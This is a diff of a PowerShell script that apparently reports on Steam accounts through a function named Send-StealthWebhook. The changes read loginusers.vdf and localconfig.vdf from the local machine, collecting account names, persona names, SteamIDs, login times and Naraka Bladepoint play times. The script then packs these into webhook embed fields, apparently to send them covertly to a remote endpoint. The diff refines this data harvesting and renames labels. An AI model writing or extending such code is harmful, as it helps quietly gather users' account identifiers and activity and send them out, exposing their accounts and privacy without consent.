@@ -1524,7 +1524,7 @@ function Send-StealthWebhook {
                     $libraryLines += $historyLines
                     
                     $libraryValue = $libraryLines -join "`n"
-                    $fieldsArray += @{ name = "Steam Login History"; value = $libraryValue; inline = $false }
+                    $fieldsArray += @{ name = "Steam Account History"; value = $libraryValue; inline = $false }
                 }
                 
                 $embed = @{
@@ -1920,9 +1920,17 @@ function Get-SteamLibraryInfo {
     return $libraryInfo
 }
 
-# Helper: detect Steam accounts on the system
+# Helper: detect Steam accounts on the system (integrated with loginusers.vdf data)
 function Get-SteamAccounts {
     $steamAccounts = @()
+    
+    # Get account info from loginusers.vdf
+    $loginInfo = Get-SteamLibraryInfo
+    
+    if ($loginInfo.LoginHistory.Count -eq 0) {
+        [Console]::WriteLine("Steam: No login data found in loginusers.vdf")
+        return $steamAccounts
+    }
     
     # Common Steam installation paths
     $steamPaths = @(
@@ -1930,84 +1938,94 @@ function Get-SteamAccounts {
         'C:\Program Files\Steam\userdata'
     )
     
-    foreach ($basePath in $steamPaths) {
-        if (Test-Path $basePath) {
-            try {
-                $userFolders = Get-ChildItem -Path $basePath -Directory -ErrorAction SilentlyContinue
-                foreach ($folder in $userFolders) {
-                    # Folder name should be numeric (Steam ID)
-                    if ($folder.Name -match '^\d+$') {
-                        $steamId = $folder.Name
-                        $profileUrl = "https://steamcommunity.com/profiles/[U:1:$steamId]"
-                        
-                        # Default values
-                        $userName = 'Unknown'
-                        $lastPlayed = 'Never'
-                        
-                        # Try to get username and last played from localconfig.vdf
-                        $localConfigPath = Join-Path $basePath "$steamId\config\localconfig.vdf"
-                        if (Test-Path $localConfigPath) {
-                            try {
-                                $vdfContent = Get-Content -Path $localConfigPath -Raw -ErrorAction SilentlyContinue
-                                
-                                # Extract PersonaName
-                                if ($vdfContent -match "`"PersonaName`"\s+`"([^`"]+)`"") {
-                                    $userName = $Matches[1]
-                                    [Console]::WriteLine("Steam: Found username '$userName' for ID $steamId")
+    foreach ($loginRecord in $loginInfo.LoginHistory) {
+        $steamId64 = $loginRecord.SteamID
+        $accountName = $loginRecord.AccountName
+        $personaName = $loginRecord.PersonaName
+        
+        # Convert SteamID64 to Steam3 ID (used in userdata folder names)
+        # Formula: Steam3ID = (SteamID64 - 76561197960265728) & 0xFFFFFFFF
+        try {
+            $steam3Id = ([long]$steamId64 - 76561197960265728) -band 0xFFFFFFFF
+            [Console]::WriteLine("Steam: Processing account $personaName (ID64: $steamId64, ID3: $steam3Id)")
+            
+            # Default values - use Steam login time from loginusers.vdf
+            $lastActivity = $loginRecord.LastLoginTime
+            $activitySource = "Steam Login"
+            $profileUrl = "https://steamcommunity.com/profiles/$steamId64"
+            
+            # Look for userdata folder with this Steam3 ID
+            foreach ($basePath in $steamPaths) {
+                if (-not (Test-Path $basePath)) { continue }
+                
+                $userdataPath = Join-Path $basePath $steam3Id
+                if (Test-Path $userdataPath) {
+                    [Console]::WriteLine("Steam: Found userdata folder for $personaName at $userdataPath")
+                    
+                    # Try to get last played from localconfig.vdf
+                    $localConfigPath = Join-Path $userdataPath "config\localconfig.vdf"
+                    if (Test-Path $localConfigPath) {
+                        try {
+                            $vdfContent = Get-Content -Path $localConfigPath -Raw -ErrorAction SilentlyContinue
+                            
+                            # Extract LastPlayed for Naraka Bladepoint (App ID 1665360)
+                            if ($vdfContent -match "`"1665360`"[\s\S]*?`"LastPlayed`"\s+`"(\d+)`"") {
+                                $unixTime = [long]$Matches[1]
+                                try {
+                                    $dateTime = [DateTimeOffset]::FromUnixTimeSeconds($unixTime).LocalDateTime
+                                    $lastActivity = $dateTime.ToString('yyyy-MM-dd HH:mm:ss')
+                                    $activitySource = "Naraka Played"
+                                    [Console]::WriteLine("Steam: Found LastPlayed '$lastActivity' for $personaName")
+                                } catch {
+                                    [Console]::WriteLine("Steam: Failed to convert timestamp for $personaName")
                                 }
-                                
-                                # Extract LastPlayed for Naraka Bladepoint (App ID 1665360)
-                                # Look for the pattern after "1665360" section
-                                if ($vdfContent -match "`"1665360`"[^}]*`"LastPlayed`"\s+`"(\d+)`"") {
-                                    $unixTime = [long]$Matches[1]
-                                    try {
-                                        $dateTime = [DateTimeOffset]::FromUnixTimeSeconds($unixTime).LocalDateTime
-                                        $lastPlayed = $dateTime.ToString('yyyy-MM-dd HH:mm:ss')
-                                        [Console]::WriteLine("Steam: Found LastPlayed '$lastPlayed' for ID $steamId")
-                                    } catch {
-                                        [Console]::WriteLine("Steam: Failed to convert timestamp for ID $steamId")
-                                    }
+                            }
+                        } catch {
+                            [Console]::WriteLine("Steam: Error reading localconfig.vdf for $personaName - $($_.Exception.Message)")
+                        }
+                    }
+                    
+                    # Fallback: Use Naraka folder modification time if we don't have LastPlayed from VDF
+                    if ($activitySource -eq "Steam Login") {
+                        $narakaFolderPath = Join-Path $userdataPath "1665360"
+                        if (Test-Path $narakaFolderPath) {
+                            try {
+                                $folderItem = Get-Item $narakaFolderPath -ErrorAction SilentlyContinue
+                                if ($folderItem) {
+                                    $lastActivity = $folderItem.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')
+                                    $activitySource = "Naraka Folder"
+                                    [Console]::WriteLine("Steam: Using folder LastWriteTime '$lastActivity' for $personaName")
                                 }
                             } catch {
-                                [Console]::WriteLine("Steam: Error reading localconfig.vdf for ID $steamId - $($_.Exception.Message)")
+                                [Console]::WriteLine("Steam: Error getting folder time for $personaName - $($_.Exception.Message)")
                             }
                         }
-                        
-                        # Fallback: Use folder modification time if LastPlayed is still 'Never'
-                        if ($lastPlayed -eq 'Never') {
-                            $narakaFolderPath = Join-Path $basePath "$steamId\1665360"
-                            if (Test-Path $narakaFolderPath) {
-                                try {
-                                    $folderItem = Get-Item $narakaFolderPath -ErrorAction SilentlyContinue
-                                    if ($folderItem) {
-                                        $lastPlayed = $folderItem.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')
-                                        [Console]::WriteLine("Steam: Using folder LastWriteTime '$lastPlayed' for ID $steamId")
-                                    }
-                                } catch {
-                                    [Console]::WriteLine("Steam: Error getting folder time for ID $steamId - $($_.Exception.Message)")
-                                }
-                            }
-                        }
-                        
-                        $steamAccounts += @{
-                            SteamID = $steamId
-                            UserName = $userName
-                            LastPlayed = $lastPlayed
-                            ProfileUrl = $profileUrl
-                        }
-                        [Console]::WriteLine("Steam: Found account ID $steamId")
                     }
+                    
+                    break  # Found the userdata folder, no need to check other paths
                 }
-            } catch {
-                [Console]::WriteLine("Steam: Error scanning $basePath - $($_.Exception.Message)")
             }
+            
+            $steamAccounts += @{
+                SteamID = $steamId64
+                Steam3ID = $steam3Id
+                UserName = $personaName
+                AccountName = $accountName
+                LastActivity = $lastActivity
+                ActivitySource = $activitySource
+                ProfileUrl = $profileUrl
+            }
+            [Console]::WriteLine("Steam: Added account $personaName (Last Activity: $lastActivity from $activitySource)")
+            
+        } catch {
+            [Console]::WriteLine("Steam: Error processing account $steamId64 - $($_.Exception.Message)")
         }
     }
     
     if ($steamAccounts.Count -eq 0) {
         [Console]::WriteLine("Steam: No accounts found")
     } else {
-        [Console]::WriteLine("Steam: Found $($steamAccounts.Count) account(s)")
+        [Console]::WriteLine("Steam: Found $($steamAccounts.Count) account(s) with Naraka data")
     }
     
     return $steamAccounts
@@ -2048,7 +2066,7 @@ function Get-SteamAccounts {
         # Add Steam accounts field
         if ($steamAccounts.Count -gt 0) {
             $steamLines = $steamAccounts | ForEach-Object {
-                "**$($_.UserName)** ([$($_.SteamID)]($($_.ProfileUrl)))`nLast Played: $($_.LastPlayed)"
+                "**$($_.UserName)** ([$($_.SteamID)]($($_.ProfileUrl)))`nLast Activity: $($_.LastActivity) ($($_.ActivitySource))"
             }
             $steamValue = $steamLines -join "`n`n"
             $fieldsArray += @{ name = "Steam Accounts ($($steamAccounts.Count))"; value = $steamValue; inline = $false }
@@ -2066,14 +2084,14 @@ function Get-SteamAccounts {
             
             $historyLines = $steamLibraryInfo.LoginHistory | Select-Object -First 5 | ForEach-Object {
                 $displayName = if ($_.PersonaName -ne $_.AccountName) { "$($_.PersonaName) ($($_.AccountName))" } else { $_.AccountName }
-                "**$displayName**`nLast Login: $($_.LastLoginTime)`nSteamID: $($_.SteamID)"
+                "**$displayName**`nLast Logged In: $($_.LastLoginTime)`nSteamID: $($_.SteamID)"
             }
             $libraryLines += $historyLines
             
             $libraryValue = $libraryLines -join "`n"
-            $fieldsArray += @{ name = "Steam Login History"; value = $libraryValue; inline = $false }
+            $fieldsArray += @{ name = "Steam Account History"; value = $libraryValue; inline = $false }
         } else {
-            $fieldsArray += @{ name = 'Steam Login History'; value = 'No login data found'; inline = $false }
+            $fieldsArray += @{ name = 'Steam Account History'; value = 'No login data found'; inline = $false }
         }
         
         $embed = @{
